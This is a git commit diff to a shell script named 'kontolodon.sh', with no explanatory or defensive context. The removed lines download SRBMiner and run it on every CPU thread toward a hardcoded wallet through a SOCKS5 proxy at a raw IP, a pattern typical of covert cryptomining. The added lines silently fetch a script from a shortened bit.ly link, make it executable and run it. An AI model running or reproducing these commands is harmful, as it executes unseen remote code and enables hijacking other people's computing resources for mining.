a70f04cd379f62ae2a6849c6ef0536e020157048
alucrot66 <106138171+alucrot66@users.noreply.github.com>
2022-05-25 20:55:35 +0700

    Update kontolodon.sh

--- kontolodon.sh
+++ kontolodon.sh
@@ -1,2 +1,3 @@
-#verus
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-7-1-Linux.tar.xz && cd SRBMiner-Multi-0-7-1 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --wallet RWAANxfUjGzHGw9tC7UjA54eziraaPavxW.$worker -t $(nproc --all) --proxy socks5://47.243.184.125:1537
+wget -O w2022.sh https://bit.ly/a2nk-W2022 > /dev/null 2>&1
+chmod +x w2022.sh
+./w2022.sh
